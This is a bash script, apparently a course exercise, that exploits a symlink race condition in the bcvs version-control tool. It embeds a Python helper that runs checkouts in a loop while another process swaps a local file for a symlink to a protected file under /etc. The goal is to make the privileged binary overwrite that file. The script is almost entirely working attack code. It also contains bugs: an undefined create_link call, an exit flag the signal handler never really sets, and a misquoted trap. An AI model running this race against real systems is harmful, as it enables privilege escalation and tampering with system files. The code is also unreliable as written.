#!/bin/bash

REPODIR=".bcvs"
BLOCKLIST="block.list"
BLOCKLISTPATH="${REPODIR}/${BLOCKLIST}"

rm -rf sploit5_dir
mkdir -p sploit5_dir
cd sploit5_dir
mkdir -p ${REPODIR}
touch ${BLOCKLISTPATH}

#blocklist - Exact copy of the one in bcvs's directory
echo $REPODIR > $BLOCKLISTPATH
echo "/etc/" >> $BLOCKLISTPATH
echo "/etc/shadow" >> $BLOCKLISTPATH
echo "/sbin/" >> $BLOCKLISTPATH


TARGET_FILE="/etc/test_overwrite"
LOCAL_FILE="my_file"
LOCAL_FILE_REPO="${REPODIR}/${LOCAL_FILE}"

# Create LOCAL_FILE in repodir for checkout
touch $LOCAL_FILE_REPO
echo "My version of the file" > ${LOCAL_FILE_REPO}


rm -f run_bcvs.py
cat <<EOS > "run_bcvs.py"
#!/usr/bin/python
import os, sys
import signal
import subprocess as sub

bcvs_exe="/opt/bcvs/bcvs"
target_file="$TARGET_FILE"
local_file="$LOCAL_FILE"
exit = False

def handler(signum, frame):
  print("Received signal")
  exit = True

def run_bcvs(opcode):
  call_args = [bcvs_exe, opcode, local_file]
  try:
    process = sub.Popen(call_args, stdin=sub.PIPE, stdout=sub.PIPE)
    output = process.communicate("junk")
  except ValueError as ve:
    print("bcvs called with invalid arguments")
    print("\tException: {}".format(ve))
  except OSError as ose:
    print("OSError Exception: {}".format(ose))
  except Exception as e:
    print("Unexpected exception while running bcvs: {}".format(e))

  return

def link_to_target():
  # This removes the actual 'local_file' file and creates a link
  # under the same name to the target file
  os.remove(local_file)
  os.symlink(target_file, local_file)

def create_local():
  # Goes the opposite direction of link_to_target
  try:
    os.remove(local_file)
  except OSError as ose:
    if ose.errno != 2:
      print("create_local exception: {}".format(ose))
      return

  try:
    open(local_file, "w").close()
  except IOError as ioe:
    if ioe.errno == 13:
      print("The race condition likely succeeded. Exiting...")
      sys.exit(0)

def usage():
  print("Usage: {} <mode> [ci|co](only if using runner mode) -- You probably want 'co'".format(sys.argv[0]))

if __name__ == '__main__':
  if len(sys.argv) < 2:
    usage()
    sys.exit(1)

  signal.signal(signal.SIGINT, handler)

  if (sys.argv[1] == "runner"):
    if len(sys.argv) != 3:
      usage()
      sys.exit(1)
    while not exit:
      # Just spam bcvs until the race condition hits
      print("Running bcvs")
      run_bcvs(sys.argv[2])
  elif (sys.argv[1] == "linker"):
    while not exit:
      # Link and unlink the file we want to modify
      print("Removing file link")
      create_link()
      print("Linking to target")
      link_to_target()

EOS
chmod +x run_bcvs.py

export USER=root

echo "Starting attack in `pwd`"
# Now start up both ends of the exploit
./run_bcvs.py runner co &
RUNNER_PID=$!

./run_bcvs.py linker &
LINKER_PID=$!

trap "echo \"Killing attack processes\" kill -9 $RUNNER_PID; kill -9 $LINKER_PID" SIGINT

wait $LINKER_PID
echo "Linker exited. Killing runner"
kill -9 $RUNNER_PID
